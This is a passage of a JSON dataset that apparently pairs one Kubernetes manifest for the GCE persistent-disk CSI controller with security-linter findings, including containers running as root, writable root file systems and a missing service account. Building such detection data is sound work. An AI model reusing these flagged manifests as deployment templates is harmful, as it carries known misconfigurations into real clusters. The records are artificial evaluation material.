fieldPath: metadata.namespace\n        ports:\n        - containerPort: 22013\n          name: http-endpoint\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 1\n          httpGet:\n            path: /healthz/leader-election\n            port: http-endpoint\n          initialDelaySeconds: 10\n          timeoutSeconds: 10\n          periodSeconds: 20\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      - name: csi-snapshotter\n        image: k8s.gcr.io/sig-storage/csi-snapshotter\n        args:\n        - --v=5\n        - --csi-address=/csi/csi.sock\n        - --metrics-address=:22014\n        - --leader-election\n        - --leader-election-namespace=$(PDCSI_NAMESPACE)\n        - --timeout=300s\n        env:\n        - name: PDCSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      - name: gce-pd-driver\n        image: gke.gcr.io/gcp-compute-persistent-disk-csi-driver\n        args:\n        - --v=5\n        - --endpoint=unix:/csi/csi.sock\n        env:\n        - name: GOOGLE_APPLICATION_CREDENTIALS\n          value: /etc/cloud-sa/cloud-sa.json\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        - name: cloud-sa-volume\n          readOnly: true\n          mountPath: /etc/cloud-sa\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: cloud-sa-volume\n        secret:\n          secretName: cloud-sa\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"csi-snapshotter\" does not have a read-only root file system"
  },
  {
    "id": "10592",
    "manifest_path": "data/manifests/the_stack_sample/sample_4089.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: csi-gce-pd-controller\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: gcp-compute-persistent-disk-csi-driver\n  template:\n    metadata:\n      labels:\n        app: gcp-compute-persistent-disk-csi-driver\n    spec:\n      serviceAccountName: csi-gce-pd-controller-sa\n      containers:\n      - name: csi-provisioner\n        image: k8s.gcr.io/sig-storage/csi-provisioner\n        args:\n        - --v=5\n        - --csi-address=/csi/csi.sock\n        - --feature-gates=Topology=true\n        - --http-endpoint=:22011\n        - --leader-election-namespace=$(PDCSI_NAMESPACE)\n        - --timeout=250s\n        - --extra-create-metadata\n        - --leader-election\n        - --default-fstype=ext4\n        env:\n        - name: PDCSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        ports:\n        - containerPort: 22011\n          name: http-endpoint\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 1\n          httpGet:\n            path: /healthz/leader-election\n            port: http-endpoint\n          initialDelaySeconds: 10\n          timeoutSeconds: 10\n          periodSeconds: 20\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      - name: csi-attacher\n        image: k8s.gcr.io/sig-storage/csi-attacher\n        args:\n        - --v=5\n        - --csi-address=/csi/csi.sock\n        - --http-endpoint=:22012\n        - --leader-election\n        - --leader-election-namespace=$(PDCSI_NAMESPACE)\n        - --timeout=250s\n        env:\n        - name: PDCSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        ports:\n        - containerPort: 22012\n          name: http-endpoint\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 1\n          httpGet:\n            path: /healthz/leader-election\n            port: http-endpoint\n          initialDelaySeconds: 10\n          timeoutSeconds: 10\n          periodSeconds: 20\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      - name: csi-resizer\n        image: k8s.gcr.io/sig-storage/csi-resizer\n        args:\n        - --v=5\n        - --csi-address=/csi/csi.sock\n        - --http-endpoint=:22013\n        - --leader-election\n        - --leader-election-namespace=$(PDCSI_NAMESPACE)\n        - --handle-volume-inuse-error=false\n        env:\n        - name: PDCSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        ports:\n        - containerPort: 22013\n          name: http-endpoint\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 1\n          httpGet:\n            path: /healthz/leader-election\n            port: http-endpoint\n          initialDelaySeconds: 10\n          timeoutSeconds: 10\n          periodSeconds: 20\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      - name: csi-snapshotter\n        image: k8s.gcr.io/sig-storage/csi-snapshotter\n        args:\n        - --v=5\n        - --csi-address=/csi/csi.sock\n        - --metrics-address=:22014\n        - --leader-election\n        - --leader-election-namespace=$(PDCSI_NAMESPACE)\n        - --timeout=300s\n        env:\n        - name: PDCSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      - name: gce-pd-driver\n        image: gke.gcr.io/gcp-compute-persistent-disk-csi-driver\n        args:\n        - --v=5\n        - --endpoint=unix:/csi/csi.sock\n        env:\n        - name: GOOGLE_APPLICATION_CREDENTIALS\n          value: /etc/cloud-sa/cloud-sa.json\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        - name: cloud-sa-volume\n          readOnly: true\n          mountPath: /etc/cloud-sa\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: cloud-sa-volume\n        secret:\n          secretName: cloud-sa\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"gce-pd-driver\" does not have a read-only root file system"
  },
  {
    "id": "10593",
    "manifest_path": "data/manifests/the_stack_sample/sample_4089.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: csi-gce-pd-controller\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: gcp-compute-persistent-disk-csi-driver\n  template:\n    metadata:\n      labels:\n        app: gcp-compute-persistent-disk-csi-driver\n    spec:\n      serviceAccountName: csi-gce-pd-controller-sa\n      containers:\n      - name: csi-provisioner\n        image: k8s.gcr.io/sig-storage/csi-provisioner\n        args:\n        - --v=5\n        - --csi-address=/csi/csi.sock\n        - --feature-gates=Topology=true\n        - --http-endpoint=:22011\n        - --leader-election-namespace=$(PDCSI_NAMESPACE)\n        - --timeout=250s\n        - --extra-create-metadata\n        - --leader-election\n        - --default-fstype=ext4\n        env:\n        - name: PDCSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        ports:\n        - containerPort: 22011\n          name: http-endpoint\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 1\n          httpGet:\n            path: /healthz/leader-election\n            port: http-endpoint\n          initialDelaySeconds: 10\n          timeoutSeconds: 10\n          periodSeconds: 20\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      - name: csi-attacher\n        image: k8s.gcr.io/sig-storage/csi-attacher\n        args:\n        - --v=5\n        - --csi-address=/csi/csi.sock\n        - --http-endpoint=:22012\n        - --leader-election\n        - --leader-election-namespace=$(PDCSI_NAMESPACE)\n        - --timeout=250s\n        env:\n        - name: PDCSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        ports:\n        - containerPort: 22012\n          name: http-endpoint\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 1\n          httpGet:\n            path: /healthz/leader-election\n            port: http-endpoint\n          initialDelaySeconds: 10\n          timeoutSeconds: 10\n          periodSeconds: 20\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      - name: csi-resizer\n        image: k8s.gcr.io/sig-storage/csi-resizer\n        args:\n        - --v=5\n        - --csi-address=/csi/csi.sock\n        - --http-endpoint=:22013\n        - --leader-election\n        - --leader-election-namespace=$(PDCSI_NAMESPACE)\n        - --handle-volume-inuse-error=false\n        env:\n        - name: PDCSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        ports:\n        - containerPort: 22013\n          name: http-endpoint\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 1\n          httpGet:\n            path: /healthz/leader-election\n            port: http-endpoint\n          initialDelaySeconds: 10\n          timeoutSeconds: 10\n          periodSeconds: 20\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      - name: csi-snapshotter\n        image: k8s.gcr.io/sig-storage/csi-snapshotter\n        args:\n        - --v=5\n        - --csi-address=/csi/csi.sock\n        - --metrics-address=:22014\n        - --leader-election\n        - --leader-election-namespace=$(PDCSI_NAMESPACE)\n        - --timeout=300s\n        env:\n        - name: PDCSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      - name: gce-pd-driver\n        image: gke.gcr.io/gcp-compute-persistent-disk-csi-driver\n        args:\n        - --v=5\n        - --endpoint=unix:/csi/csi.sock\n        env:\n        - name: GOOGLE_APPLICATION_CREDENTIALS\n          value: /etc/cloud-sa/cloud-sa.json\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        - name: cloud-sa-volume\n          readOnly: true\n          mountPath: /etc/cloud-sa\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: cloud-sa-volume\n        secret:\n          secretName: cloud-sa\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"csi-gce-pd-controller-sa\" not found"
  },
  {
    "id": "10594",
    "manifest_path": "data/manifests/the_stack_sample/sample_4089.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: csi-gce-pd-controller\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: gcp-compute-persistent-disk-csi-driver\n  template:\n    metadata:\n      labels:\n        app: gcp-compute-persistent-disk-csi-driver\n    spec:\n      serviceAccountName: csi-gce-pd-controller-sa\n      containers:\n      - name: csi-provisioner\n        image: k8s.gcr.io/sig-storage/csi-provisioner\n        args:\n        - --v=5\n        - --csi-address=/csi/csi.sock\n        - --feature-gates=Topology=true\n        - --http-endpoint=:22011\n        - --leader-election-namespace=$(PDCSI_NAMESPACE)\n        - --timeout=250s\n        - --extra-create-metadata\n        - --leader-election\n        - --default-fstype=ext4\n        env:\n        - name: PDCSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        ports:\n        - containerPort: 22011\n          name: http-endpoint\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 1\n          httpGet:\n            path: /healthz/leader-election\n            port: http-endpoint\n          initialDelaySeconds: 10\n          timeoutSeconds: 10\n          periodSeconds: 20\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      - name: csi-attacher\n        image: k8s.gcr.io/sig-storage/csi-attacher\n        args:\n        - --v=5\n        - --csi-address=/csi/csi.sock\n        - --http-endpoint=:22012\n        - --leader-election\n        - --leader-election-namespace=$(PDCSI_NAMESPACE)\n        - --timeout=250s\n        env:\n        - name: PDCSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        ports:\n        - containerPort: 22012\n          name: http-endpoint\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 1\n          httpGet:\n            path: /healthz/leader-election\n            port: http-endpoint\n          initialDelaySeconds: 10\n          timeoutSeconds: 10\n          periodSeconds: 20\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      - name: csi-resizer\n        image: k8s.gcr.io/sig-storage/csi-resizer\n        args:\n        - --v=5\n        - --csi-address=/csi/csi.sock\n        - --http-endpoint=:22013\n        - --leader-election\n        - --leader-election-namespace=$(PDCSI_NAMESPACE)\n        - --handle-volume-inuse-error=false\n        env:\n        - name: PDCSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        ports:\n        - containerPort: 22013\n          name: http-endpoint\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 1\n          httpGet:\n            path: /healthz/leader-election\n            port: http-endpoint\n          initialDelaySeconds: 10\n          timeoutSeconds: 10\n          periodSeconds: 20\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      - name: csi-snapshotter\n        image: k8s.gcr.io/sig-storage/csi-snapshotter\n        args:\n        - --v=5\n        - --csi-address=/csi/csi.sock\n        - --metrics-address=:22014\n        - --leader-election\n        - --leader-election-namespace=$(PDCSI_NAMESPACE)\n        - --timeout=300s\n        env:\n        - name: PDCSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      - name: gce-pd-driver\n        image: gke.gcr.io/gcp-compute-persistent-disk-csi-driver\n        args:\n        - --v=5\n        - --endpoint=unix:/csi/csi.sock\n        env:\n        - name: GOOGLE_APPLICATION_CREDENTIALS\n          value: /etc/cloud-sa/cloud-sa.json\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        - name: cloud-sa-volume\n          readOnly: true\n          mountPath: /etc/cloud-sa\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: cloud-sa-volume\n        secret:\n          secretName: cloud-sa\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"csi-attacher\" is not set to runAsNonRoot"
  },
  {
    "id": "10595",
    "manifest_path": "data/manifests/the_stack_sample/sample_4089.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: csi-gce-pd-controller\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: gcp-compute-persistent-disk-csi-driver\n  template:\n    metadata:\n      labels:\n        app: gcp-compute-persistent-disk-csi-driver\n    spec:\n      serviceAccountName: csi-gce-pd-controller-sa\n      containers:\n      - name: csi-provisioner\n        image: k8s.gcr.io/sig-storage/csi-provisioner\n        args:\n        - --v=5\n        - --csi-address=/csi/csi.sock\n        - --feature-gates=Topology=true\n        - --http-endpoint=:22011\n        - --leader-election-namespace=$(PDCSI_NAMESPACE)\n        - --timeout=250s\n        - --extra-create-metadata\n        - --leader-election\n        - --default-fstype=ext4\n        env:\n        - name: PDCSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        ports:\n        - containerPort: 22011\n          name: http-endpoint\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 1\n          httpGet:\n            path: /healthz/leader-election\n            port: http-endpoint\n          initialDelaySeconds: 10\n          timeoutSeconds: 10\n          periodSeconds: 20\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      - name: csi-attacher\n        image: k8s.gcr.io/sig-storage/csi-attacher\n        args:\n        - --v=5\n        - --csi-address=/csi/csi.sock\n        - --http-endpoint=:22012\n        - --leader-election\n        - --leader-election-namespace=$(PDCSI_NAMESPACE)\n        - --timeout=250s\n        env:\n        - name: PDCSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        ports:\n        - containerPort: 22012\n          name: http-endpoint\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 1\n          httpGet:\n            path: /healthz/leader-election\n            port: http-endpoint\n          initialDelaySeconds: 10\n          timeoutSeconds: 10\n          periodSeconds: 20\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      - name: csi-resizer\n        image: k8s.gcr.io/sig-storage/csi-resizer\n        args:\n        - --v=5\n        - --csi-address=/csi/csi.sock\n        - --http-endpoint=:22013\n        - --leader-election\n        - --leader-election-namespace=$(PDCSI_NAMESPACE)\n        - --handle-volume-inuse-error=false\n        env:\n        - name: PDCSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        ports:\n        - containerPort: 22013\n          name: http-endpoint\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 1\n          httpGet:\n            path: /healthz/leader-election\n            port: http-endpoint\n          initialDelaySeconds: 10\n          timeoutSeconds: 10\n          periodSeconds: 20\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      - name: csi-snapshotter\n        image: k8s.gcr.io/sig-storage/csi-snapshotter\n        args:\n        - --v=5\n        - --csi-address=/csi/csi.sock\n        - --metrics-address=:22014\n        - --leader-election\n        - --leader-election-namespace=$(PDCSI_NAMESPACE)\n        - --timeout=300s\n        env:\n        - name: PDCSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      - name: gce-pd-driver\n        image: gke.gcr.io/gcp-compute-persistent-disk-csi-driver\n        args:\n        - --v=5\n        - --endpoint=unix:/csi/csi.sock\n        env:\n        - name: GOOGLE_APPLICATION_CREDENTIALS\n          value: /etc/cloud-sa/cloud-sa.json\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        - name: cloud-sa-volume\n          readOnly: true\n          mountPath: /etc/cloud-sa\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: cloud-sa-volume\n        secret:\n          secretName: cloud-sa\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"csi-provisioner\" is not set to runAsNonRoot"
  },
  {
    "id": "10596",
    "manifest_path": "data/manifests/the_stack_sample/sample_4089.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: csi-gce-pd-controller\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: gcp-compute-persistent-disk-csi-driver\n  template:\n    metadata:\n      labels:\n        app: gcp-compute-persistent-disk-csi-driver\n    spec:\n      serviceAccountName: csi-gce-pd-controller-sa\n      containers:\n      - name: csi-provisioner\n        image: k8s.gcr.io/sig-storage/csi-provisioner\n        args:\n        - --v=5\n        - --csi-address=/csi/csi.sock\n        - --feature-gates=Topology=true\n        - --http-endpoint=:22011\n        - --leader-election-namespace=$(PDCSI_NAMESPACE)\n        - --timeout=250s\n        - --extra-create-metadata\n        - --leader-election\n        - --default-fstype=ext4\n        env:\n        - name: PDCSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        ports:\n        - containerPort: 22011\n          name: http-endpoint\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 1\n          httpGet:\n            path: /healthz/leader-election\n            port: http-endpoint\n          initialDelaySeconds: 10\n          timeoutSeconds: 10\n          periodSeconds: 20\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      - name: csi-attacher\n        image: k8s.gcr.io/sig-storage/csi-attacher\n        args:\n        - --v=5\n        - --csi-address=/csi/csi.sock\n        - --http-endpoint=:22012\n        - --leader-election\n        - --leader-election-namespace=$(PDCSI_NAMESPACE)\n        - --timeout=250s\n        env:\n        - name: PDCSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        ports:\n        - containerPort: 22012\n          name: http-endpoint\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 1\n          httpGet:\n            path: /healthz/leader-election\n            port: http-endpoint\n          initialDelaySeconds: 10\n          timeoutSeconds: 10\n          periodSeconds: 20\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      - name: csi-resizer\n        image: k8s.gcr.io/sig-storage/csi-resizer\n        args:\n        - --v=5\n        - --csi-address=/csi/csi.sock\n        - --http-endpoint=:22013\n        - --leader-election\n        - --leader-election-namespace=$(PDCSI_NAMESPACE)\n        - --handle-volume-inuse-error=false\n        env:\n        - name: PDCSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        ports:\n        - containerPort: 22013\n          name: http-endpoint\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 1\n          httpGet:\n            path: /healthz/leader-election\n            port: http-endpoint\n          initialDelaySeconds: 10\n          timeoutSeconds: 10\n          periodSeconds: 20\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      - name: csi-snapshotter\n        image: k8s.gcr.io/sig-storage/csi-snapshotter\n        args:\n        - --v=5\n        - --csi-address=/csi/csi.sock\n        - --metrics-address=:22014\n        - --leader-election\n        - --leader-election-namespace=$(PDCSI_NAMESPACE)\n        - --timeout=300s\n        env:\n        - name: PDCSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      - name: gce-pd-driver\n        image: gke.gcr.io/gcp-compute-persistent-disk-csi-driver\n        args:\n        - --v=5\n        - --endpoint=unix:/csi/csi.sock\n        env:\n        - name: GOOGLE_APPLICATION_CREDENTIALS\n          value: /etc/cloud-sa/cloud-sa.json\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        - name: cloud-sa-volume\n          readOnly: true\n          mountPath: /etc/cloud-sa\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: cloud-sa-volume\n        secret:\n          secretName: cloud-sa\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"csi-resizer\" is not set to runAsNonRoot"
  },
  {
    "id": "10597",
    "manifest_path": "data/manifests/the_stack_sample/sample_4089.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: csi-gce-pd-controller\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: gcp-compute-persistent-disk-csi-driver\n  template:\n    metadata:\n      labels:\n        app: gcp-compute-persistent-disk-csi-driver\n    spec:\n      serviceAccountName: csi-gce-pd-controller-sa\n      containers:\n      - name: csi-provisioner\n        image: k8s.gcr.io/sig-storage/csi-provisioner\n        args:\n        - --v=5\n        - --csi-address=/csi/csi.sock\n        - --feature-gates=Topology=true\n        - --http-endpoint=:22011\n        - --leader-election-namespace=$(PDCSI_NAMESPACE)\n        - --timeout=250s\n        - --extra-create-metadata\n        - --leader-election\n        - --default-fstype=ext4\n        env:\n        - name: PDCSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        ports:\n        - containerPort: 22011\n          name: http-endpoint\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 1\n          httpGet:\n            path: /healthz/leader-election\n            port: http-endpoint\n          initialDelaySeconds: 10\n          timeoutSeconds: 10\n          periodSeconds: 20\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      - name: csi-attacher\n        image: k8s.gcr.io/sig-storage/csi-attacher\n        args:\n        - --v=5\n        - --csi-address=/csi/csi.sock\n        - --http-endpoint=:22012\n        - --leader-election\n        - --leader-election-namespace=$(PDCSI_NAMESPACE)\n        - --timeout=250s\n        env:\n        - name: PDCSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        ports:\n        - containerPort: 22012\n          name: http-endpoint\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 1\n          httpGet:\n            path: /healthz/leader-election\n            port: http-endpoint\n          initialDelaySeconds: 10\n          timeoutSeconds: 10\n          periodSeconds: 20\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      - name: csi-resizer\n        image: k8s.gcr.io/sig-storage/csi-resizer\n        args:\n        - --v=5\n        - --csi-address=/csi/csi.sock\n        - --http-endpoint=:22013\n        - --leader-election\n        - --leader-election-namespace=$(PDCSI_NAMESPACE)\n        - --handle-volume-inuse-error=false\n        env:\n        - name: PDCSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        ports:\n        - containerPort: 22013\n          name: http-endpoint\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 1\n          httpGet:\n            path: /healthz/leader-election\n            port: http-endpoint\n          initialDelaySeconds: 10\n          timeoutSeconds: 10\n          periodSeconds: 20\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      - name: csi-snapshotter\n        image: k8s.gcr.io/sig-storage/csi-snapshotter\n        args:\n        - --v=5\n        - --csi-address=/csi/csi.sock\n        - --metrics-address=:22014\n        - --leader-election\n        - --leader-election-namespace=$(PDCSI_NAMESPACE)\n        - --timeout=300s\n        env:\n        - name: PDCSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      - name: gce-pd-driver\n        image: gke.gcr.io/gcp-compute-persistent-disk-csi-driver\n        args:\n        - --v=5\n        - --endpoint=unix:/csi/csi.sock\n        env:\n        - name: GOOGLE_APPLICATION_CREDENTIALS\n          value: /etc/cloud-sa/cloud-sa.json\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        - name: cloud-sa-volume\n          readOnly: true\n          mountPath: /etc/cloud-sa\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: cloud-sa-volume\n        secret:\n          secretName: cloud-sa\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"csi-snapshotter\" is not set to runAsNonRoot"
  },
  {
    "id": "10598",
    "manifest_path": "data/manifests/the_stack_sample/sample_4089.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: csi-gce-pd-controller\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: gcp-compute-persistent-disk-csi-driver\n  template:\n    metadata:\n      labels:\n        app: gcp-compute-persistent-disk-csi-driver\n    spec:\n      serviceAccountName: csi-gce-pd-controller-sa\n      containers:\n      - name: csi-provisioner\n        image: k8s.gcr.io/sig-storage/csi-provisioner\n        args:\n        - --v=5\n        - --csi-address=/csi/csi.sock\n        - --feature-gates=Topology=true\n        - --http-endpoint=:22011\n        - --leader-election-namespace=$(PDCSI_NAMESPACE)\n        - --timeout=250s\n        - --extra-create-metadata\n        - --leader-election\n        - --default-fstype=ext4\n        env:\n        - name: PDCSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        ports:\n        - containerPort: 22011\n          name: http-endpoint\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 1\n          httpGet:\n            path: /healthz/leader-election\n            port: http-endpoint\n          initialDelaySeconds: 10\n          timeoutSeconds: 10\n          periodSeconds: 20\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      - name: csi-attacher\n        image: k8s.gcr.io/sig-storage/csi-attacher\n        args:\n        - --v=5\n        - --csi-address=/csi/csi.sock\n        - --http-endpoint=:22012\n        - --leader-election\n        - --leader-election-namespace=$(PDCSI_NAMESPACE)\n        - --timeout=250s\n        env:\n        - name: PDCSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        ports:\n        - containerPort: 22012\n          name: http-endpoint\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 1\n          httpGet:\n            path: /healthz/leader-election\n            port: http-endpoint\n          initialDelaySeconds: 10\n          timeoutSeconds: 10\n          periodSeconds: 20\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      - name: csi-resizer\n        image: k8s.gcr.io/sig-storage/csi-resizer\n        args:\n        - --v=5\n        - --csi-address=/csi/csi.sock\n        - --http-endpoint=:22013\n        - --leader-election\n        - --leader-election-namespace=$(PDCSI_NAMESPACE)\n        - --handle-volume-inuse-error=false\n        env:\n        - name: PDCSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        ports:\n        - containerPort: 22013\n          name: http-endpoint\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 1\n          httpGet:\n            path: /healthz/leader-election\n            port: http-endpoint\n          initialDelaySeconds: 10\n          timeoutSeconds: 10\n          periodSeconds: 20\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      - name: csi-snapshotter\n        image: k8s.gcr.io/sig-storage/csi-snapshotter\n        args:\n        - --v=5\n        - --csi-address=/csi/csi.sock\n        - --metrics-address=:22014\n        - --leader-election\n        - --leader-election-namespace=$(PDCSI_NAMESPACE)\n        - --timeout=300s\n        env:\n        - name: PDCSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      - name: gce-pd-driver\n        image: gke.gcr.io/gcp-compute-persistent-disk-csi-driver\n        args:\n        - --v=5\n        - --endpoint=unix:/csi/csi.sock\n        env:\n        - name: GOOGLE_APPLICATION_CREDENTIALS\n          value: /etc/cloud-sa/cloud-sa.json\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        - name: cloud-sa-volume\n          readOnly: true\n          mountPath: /etc/cloud-sa\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: cloud-sa-volume\n        secret:\n          secretName: cloud-sa\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"gce-pd-driver\" is not set to runAsNonRoot"
  },
  {
    "id": "10599",
    "manifest_path": "data/manifests/the_stack_sample/sample_4089.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: csi-gce-pd-controller\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: gcp-compute-persistent-disk-csi-driver\n  template:\n    metadata:\n      labels:\n        app: gcp-compute-persistent-disk-csi-driver\n    spec:\n      serviceAccountName: csi-gce-pd-controller-sa\n      containers:\n      - name: csi-provisioner\n        image: k8s.gcr.io/sig-storage/csi-provisioner\n        args:\n        - --v=5\n        - --csi-address=/csi/csi.sock\n        - --feature-gates=Topology=true\n        - --http-endpoint=:22011\n        - --leader-election-namespace=$(PDCSI_NAMESPACE)\n        - --timeout=250s\n        - --extra-create-metadata\n        - --leader-election\n        - --default-fstype=ext4\n        env:\n        - name: PDCSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        ports:\n        - containerPort: 22011\n          name: http-endpoint\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 1\n          httpGet:\n            path: /healthz/leader-election\n            port: http-endpoint\n          initialDelaySeconds: 10\n          timeoutSeconds: 10\n          periodSeconds: 20\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      - name: csi-attacher\n        image: k8s.gcr.io/sig-storage/csi-attacher\n        args:\n        - --v=5\n        - --csi-address=/csi/csi.sock\n        - --http-endpoint=:22012\n        - --leader-election\n        - 